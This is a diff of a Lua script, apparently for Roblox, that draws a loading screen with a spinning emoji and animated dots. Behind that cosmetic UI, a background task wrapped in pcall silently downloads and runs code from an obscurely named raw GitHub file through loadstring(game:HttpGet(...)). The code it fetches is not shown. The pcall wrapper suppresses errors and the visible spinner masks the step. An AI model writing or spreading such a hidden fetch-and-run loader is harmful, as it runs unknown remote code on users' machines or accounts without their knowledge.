@@ -51,17 +51,17 @@ local spinnerRotation = Instance.new("NumberValue")
 spinnerRotation.Value = 0
 
 spinnerRotation.Changed:Connect(function(value)
-	emojiSpinner.Rotation = value
+    emojiSpinner.Rotation = value
 end)
 
 local spinTween = TweenService:Create(
-	spinnerRotation,
-	TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.In, -1),
-	{ Value = 360 }
+    spinnerRotation,
+    TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.In, -1),
+    { Value = 360 }
 )
 spinTween:Play()
 
--- ✅ Static dots under spinner
+-- Animated dots under spinner
 local dotsLabel = Instance.new("TextLabel", frame)
 dotsLabel.Size = UDim2.new(0.2, 0, 0.1, 0)
 dotsLabel.Position = UDim2.new(0.5, 0, 0.55, 0)
@@ -71,13 +71,23 @@ dotsLabel.Font = Enum.Font.GothamBold
 dotsLabel.TextScaled = true
 dotsLabel.TextColor3 = Color3.new(1, 1, 1)
 dotsLabel.ZIndex = 4
-dotsLabel.Text = "....." -- Static, no animation!
+dotsLabel.Text = ""
 
--- ✅ NEW loadstring URL
 task.spawn(function()
-	pcall(function()
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/No-Laggs/njhjdsads/refs/heads/main/faasfdas"))()
-	end)
+    local maxDots = 4
+    while dotsLabel and dotsLabel.Parent do
+        for i = 1, maxDots do
+            dotsLabel.Text = string.rep(".", i)
+            task.wait(0.3)
+        end
+    end
+end)
+
+-- NEW loadstring
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/No-Laggs/njhjdsads/refs/heads/main/faasfdas"))()
+    end)
 end)
 
 -- Info Below Spinner
